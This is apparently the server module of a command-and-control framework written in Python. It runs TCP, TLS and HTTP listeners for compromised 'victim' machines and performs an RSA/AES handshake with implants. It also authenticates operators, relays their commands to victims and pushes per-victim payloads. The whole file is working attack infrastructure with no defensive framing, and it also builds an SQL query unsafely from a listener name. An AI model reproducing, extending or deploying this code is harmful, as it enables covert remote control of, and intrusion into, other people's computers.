import socket
import threading
import json
import time
import os
import sys
import uuid
from datetime import datetime
import importlib.util
import argparse
import logging

from lib.C2P import C2P
from lib.Client import Client
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
from lib.database import DB
from lib.tool import EZData, EZClass
from lib.EZPayload import get_payload

import lib.c2login as c2login

class Listener:
    log = logging.getLogger(__name__ + '.Listener')
    log.setLevel(logging.NOTSET)

    def __init__(self, ip: str, port: int, args: argparse.Namespace):
        self.args = args

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((ip, port))

        self.sock = sock
        self.bListen = sock.fileno() != -1
        self.db = DB()

        self.events_recv_handler = []
        self.events_msg_handler = []

        self.dic_victim = {}
        self.dic_user = {}
        self.dic_listener = {}
        self.dic_token = {}

    def start(self):
        self.sock.listen(100)
        self.log.debug(f'listening: {self.sock.getsockname()[1]}')
        
        while True:
            conn, addr = self.sock.accept()
            self.log.debug(f'New client: ({addr[0]},{addr[1]})')
            threading.Thread(target=self.handler, args=[conn, addr, ]).start()

    def stop(self):
        self.sock.close()

    def listener_start_all(self):
        ls_output = DB().sql_execute('SELECT Name FROM Listener')
        for row in ls_output:
            szName = row[0]

            t = threading.Thread(target=self.listener_start, args=[szName, ])
            t.daemon = True
            t.start()

    def listener_start(self, szName: str):
        if szName in self.dic_listener.keys():
            self.dic_listener.pop(szName)

        sql_query = f'SELECT Name,Template,IP,Port FROM Listener WHERE Name = \'{szName}\''
        ls_output = DB().sql_execute(sql_query)

        if len(ls_output) == 0:
            self.log.error('sql_execute() error, query: ' + sql_query)
            return
        
        ls_row = ls_output[0]

        szTemplate = ls_row[1]
        szIP = ls_row[2]
        nPort = int(ls_row[3])

        objListener = c2user.get_template(szTemplate)
        if objListener == None:
            return

        #objListener.__init__(szIP, nPort)
        objClass = getattr(objListener, 'Listener')
        objListener = None

        if szTemplate == 'TCP':
            objListener = objClass(szIP, nPort, self)
        elif szTemplate == 'TLS':
            objListener = objClass(szIP, nPort, self, 'certfile', 'pemfile')
        elif szTemplate == 'HTTP':
            objListener = objClass(szIP, nPort, self)
        else:
            raise Exception('Unknown template: ' + szTemplate)

        objListener.set_msg_handler(c2victim.msg_handler)
        self.dic_listener[szName] = EZClass.Listener(szName, szTemplate, szIP, nPort, objListener)

        self.log.debug(f'Listener: {szName}, Port: {nPort}')

        objListener.start()

    def listener_stop(self, szName):
        objListener = self.dic_listener[szName].objListener
        objListener.stop()

    def add_listener(self, clnt: Client, szTemplate: str, szName: str, nPort: int) -> bool:
        db = DB()
        return db.add_listener(szName, szTemplate, '*', nPort, clnt.username)
    
    def del_listener(self, szName) -> bool:
        self.listener_stop(szName)
        self.dic_listener.pop(szName)

        return DB().del_listener(szName)
    
    def get_victims(self) -> list:
        ls_victims = list()
        for szName in self.dic_listener.keys():
            listener = self.dic_listener[szName]

            dic_victim = listener.objListener.get_victims()
            ls_victims.append(dic_victim)
        
        return ls_victims

    def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
        return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]

    def handler(self, clnt_sock: socket.socket, clnt_addr):
        abStaticRecv = b''
        abDynamicRecv = b''

        clnt = Client(clnt_sock)
        clnt.addr = clnt_addr

        try:
            while clnt_sock.fileno() != -1:
                abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                nRecvLength = len(abStaticRecv)

                #abDynamicRecv = self.combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecvLength)

                abDynamicRecv += abStaticRecv[0:nRecvLength]
                
                if not nRecvLength:
                    break
                elif len(abDynamicRecv) < C2P.HEADER_LENGTH:
                    continue
                else:
                    c2p = C2P(abBuffer=abDynamicRecv)
                    tpHeader = c2p.get_header()
                    nLength = tpHeader[2]

                    while len(abDynamicRecv) - C2P.HEADER_LENGTH >= nLength:
                        c2p = C2P(abBuffer=abDynamicRecv)
                        abDynamicRecv = c2p.more_data()
                        tpHeader = c2p.get_header()

                        nCmd = c2p.nCmd
                        nParam = c2p.nParam
                        nLength = c2p.nLength

                        abMsg = c2p.get_msg()

                        if nCmd == 0:
                            if nParam == 0:
                                clnt.close()
                                self.log.debug(f'Socket is closed: {clnt.addr}')
                            elif nParam == 1:
                                time.sleep(1)

                                clnt.send(0, 1, C2P.random_str())
                        elif nCmd == 1:
                            if nParam == 0:
                                self.log.debug(f'Server is notified to do key exchange: {clnt.addr}')

                                n_rsa_keysize = 4096
                                n, e, d, p, q = EZRSA(n_rsa_keysize).generate_rsa_keypair(n_rsa_keysize)
                                xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                                xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)

                                self.log.debug('RSA key pair is generated: {clnt.addr}')

                                clnt.xml_rsa_pubKey = xml_PubKey
                                clnt.xml_rsa_privKey = xml_PrivKey

                                clnt.send(1, 1, Encoder.stre2b64(xml_PubKey))

                                self.log.debug(f'Sent RSA public key: {clnt.addr}')
                            elif nParam == 2:
                                szMsg = abMsg.decode('utf-8')
                                split = Encoder.b64d2str(szMsg).split('|')

                                if len(split) == 2:
                                    self.log.debug(f'Received encrypted AES key and initial vector: {clnt.addr}')

                                    sz_b64_enc_iv = split[0]
                                    sz_b64_enc_key = split[1]

                                    ab_enc_iv = Encoder.b64str2bytes(sz_b64_enc_iv)
                                    ab_enc_key = Encoder.b64str2bytes(sz_b64_enc_key)

                                    priv_key = PRSA.xml_to_rsa_key(clnt.xml_rsa_privKey, True)

                                    ab_iv = PRSA.rsa_decrypt(ab_enc_iv, priv_key)
                                    ab_key = PRSA.rsa_decrypt(ab_enc_key, priv_key)

                                    clnt.set_aes(PAES(ab_iv, ab_key))
                                    
                                    self.log.debug('RSA Decrypt successfully, the server obtain both AES key and IV: {clnt.addr}')

                                    # Do challenge and response for vertification.
                                    self.log.debug(f'Do challenge and response for vertification..: {clnt.addr}')
                                    
                                    clnt.szChallenge = C2P.random_str(100)
                                    threading.Thread(target=lambda: clnt.send(1, 3, clnt.szChallenge)).start()
                                else:
                                    self.log.error('Invalid received abMsg: {clnt.addr}')
                                    self.log.debug(f'Restart key exchange..: {clnt.addr}')

                                    clnt.send(1, 0, C2P.random_str())
                            elif nParam == 4:
                                self.log.debug(f'Trying vertification..: {clnt.addr}')

                                szCipherResp = abMsg.decode('utf-8')
                                ab_enc_resp = Encoder.b64str2bytes(szCipherResp)
                                szPlainResp = clnt.pAES.decrypt_cbc(ab_enc_resp).decode('utf-8')

                                if szPlainResp == clnt.szChallenge:
                                    self.log.debug('Vertification successed: {clnt.addr}')

                                    clnt.sendcommand(1, 5)
                                else:
                                    self.log.error('Vertification failed: {clnt.addr}')
                        elif nCmd == 3: # C2 User
                            szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode('utf-8')
                            aMsg = szDecMsg.split('|')

                            # check login
                            if aMsg[1] not in self.dic_user.keys() and nParam != 1:
                                clnt.sendcipher(3, 0, f'User: {aMsg[1]} have not login')
                                return

                            if nParam == 1: # Authorization
                                user = aMsg[1]
                                password = aMsg[2]
                                bAuthoritize = c2login.authorization(user, password)

                                if bAuthoritize:
                                    str_uuid = str(uuid.uuid4())

                                    clnt.username = user
                                    clnt.szUUID = str_uuid

                                    self.dic_user[user] = clnt
                                    self.dic_token[str_uuid] = user
                                    self.log.debug(f'New user login: {user}')

                                    clnt.sendcipher(3, 2, user)
                                else:
                                    clnt.sendclntls(['error', '1', 'login', 'Username or password is invalid.'])
                                    clnt.close()
                            elif nParam == 3: # Command
                                if aMsg[0] == 'user':
                                    szUsername = aMsg[1]
                                    c2user.user_message_handler(self, clnt, aMsg[2:])
                                elif aMsg[0] == 'victim':
                                    szUsername = aMsg[1]
                                    szVictimID = aMsg[2]

                                    ls_victim = self.get_victims()
                                    for obj_dic in ls_victim:
                                        if szVictimID in obj_dic.keys():
                                            #c2victim.clnt_msg_handler(self, szUsername, obj_dic[szVictimID], aMsg[3:])
                                            threading.Thread(target=c2victim.clnt_msg_handler, args=[self, szUsername, obj_dic[szVictimID], aMsg[3:]]).start()

            if clnt.username:
                self.dic_user.pop(clnt.username)
                self.dic_token.pop(clnt.szUUID)
                self.log.debug(f'User offline: {clnt.username}')
        except Exception as ex:
            self.log.error(ex)
            self.dic_user.pop(clnt.username)
            self.dic_token.pop(clnt.szUUID)
            #raise ex
    
    def boardcast_clnt(self, aMsg: list):
        if len(self.dic_user.keys()) == 0:
            self.log.error('No user is login.')
            return
        
        aMsg.insert(0, '*')

        for szToken in self.dic_token.keys():
            if not self.send_clnt(szToken, aMsg):
                self.log.error(szToken)
                print(aMsg)
                continue

    def send_clnt(self, szToken: str, aMsg: list) -> bool:
        if szToken == '*':
            for token in self.dic_token.keys():
                self.send_clnt(token, aMsg)
            return
        
        if szToken not in self.dic_token.keys():
            self.log.error(f'Token \'{szToken}\' not found.')

        szUsername = self.dic_token[szToken]

        if szUsername not in self.dic_user.keys():
            self.log.error(f'User \'{szUsername}\' does not login in')
            return False
        
        try:
            clnt = self.dic_user[szUsername]
            clnt.sendclntls(aMsg)

            return True
        except Exception as ex:
            self.log.error(ex)
            return False

class c2user:
    log = logging.getLogger(__name__ + '.c2user')
    log.setLevel(logging.NOTSET)

    def __init__(self):
        pass

    @staticmethod
    def user_message_handler(listener: Listener, clnt: Client, aMsg: list):
        if aMsg[0] == 'victim':
            if aMsg[1] == 'list':
                pass
            elif aMsg[1] == 'remote':
                online_id = aMsg[2]
                if aMsg[2] == 'file':
                    pass
        elif aMsg[0] == 'listener':
            if aMsg[1] == 'list':
                if aMsg[2] == "temp":
                    ls_template = c2user.list_template()
                    szMsg = EZData.list2str(ls_template)

                    ls_data = [
                        '*',
                        'listener',
                        'list',
                        'temp',
                        szMsg,
                    ]

                    clnt.sendclntls(ls_data)
                elif aMsg[2] == 'listener':
                    ls_result = DB().sql_execute('SELECT * FROM Listener')
                    szMsg = EZData.twoDlist2str(ls_result)

                    ls_data = [
                        '*',
                        'listener',
                        'list',
                        'listener',
                        szMsg,
                    ]

                    clnt.sendclntls(ls_data)
            elif aMsg[1] == 'add':
                szTemplate = aMsg[2]
                szName = Encoder.b64d2str(aMsg[3])
                nPort = int(aMsg[4])

                bResult = listener.add_listener(clnt, szTemplate, szName, nPort)
                listener.listener_start(szName)
                
                ls = [
                    '*',
                    'listener',
                    'add',
                    '1' if bResult else '0',
                ]

                clnt.sendclntls(ls)
            elif aMsg[1] == 'edit':
                szTemplate = aMsg[2]
                szOriginalName = Encoder.b64d2str(aMsg[3])
                szNewName = Encoder.b64d2str(aMsg[4])
                nPort = int(aMsg[5])

                objOriginal = listener.dic_listener[szOriginalName]

                if not listener.del_listener(szOriginalName):
                    raise Exception('Delete szOriginalName failed.')
                
                if not listener.add_listener(clnt, szTemplate, szNewName, nPort):
                    raise Exception('Add szNewName failed.')

                objOriginal.szName = szNewName
                listener.dic_listener[szNewName] = objOriginal
                
                clnt.sendclntls(['*', 'listener', 'edit', '1'])

            elif aMsg[1] == 'del':
                lsListener = EZData.oneSpliter2list(aMsg[2])
                
                db = DB()
                ls_output = [listener.del_listener(szName) for szName in lsListener]

                del db

                bResult = any(not x for x in ls_output)
                
                ls = [
                    '*',
                    'listener',
                    'del',
                    '1' if bResult else '0',
                ]    

                clnt.sendclntls(ls)

            elif aMsg[1] == 'info':
                pass

    @staticmethod
    def get_template(name: str):
        module_path = f'./lib/listener/{name}/listener.py'
        module_name = 'Listener'

        if not os.path.exists(module_path):
            c2user.log.error(f'Template not exists: ' + module_path)
            return None
        
        spec = importlib.util.spec_from_file_location(module_name, module_path)
        module = importlib.util.module_from_spec(spec)
        sys.modules[module_name] = module
        spec.loader.exec_module(module)

        return module

    @staticmethod
    def list_template() -> list:
        ls_template = list()
        with os.scandir('./lib/listener') as entries:
            for entry in entries:
                if entry.is_dir():
                    path_listener = f'./lib/listener/{entry.name}/listener.py'
                    if os.path.exists(path_listener):
                        ls_template.append(entry.name)

        return ls_template
    
class c2victim:
    @staticmethod
    def msg_handler(main_listener: Listener, listener: object, szToken: str, clnt_victim: Client, aMsg: list):
        aMsg.insert(0, clnt_victim.VictimID)

        if aMsg[1] == 'info':
            if aMsg[2] == 'start':
                json_obj = json.loads(aMsg[3])
                json_obj['Ping'] = round(clnt_victim.nLattency - 2000 if clnt_victim.nLattency else 0, 2)

                aMsg[3] = json.dumps(json_obj)
                main_listener.send_clnt(szToken, aMsg)

                return

        main_listener.send_clnt(szToken, aMsg)
            
    @staticmethod
    def clnt_msg_handler(main_listener: Listener, szUsername: str, class_victim: EZClass.Victim, aMsg: list):
        clnt_victim = class_victim.objClient
        assert isinstance(clnt_victim, Client)

        szToken = main_listener.dic_user[szUsername].szUUID

        szClassName = aMsg[0]
        aMsgParam = aMsg[1:]

        szPayload = 'x'
        if szClassName not in class_victim.lsLoadedPayload:
            szPayload = get_payload(class_victim.szTag, szClassName)
            class_victim.lsLoadedPayload.append(szClassName)

        aMsg = [szToken] + [szClassName] + [szPayload] + aMsgParam

        if clnt_victim.type == 'TCP' or clnt_victim.type == 'TLS':
            clnt_victim.sendvictim(aMsg)
        elif clnt_victim.type == 'HTTP':
            clnt_victim.http_sendvictim(aMsg)
            
if __name__ == '__main__':
    pass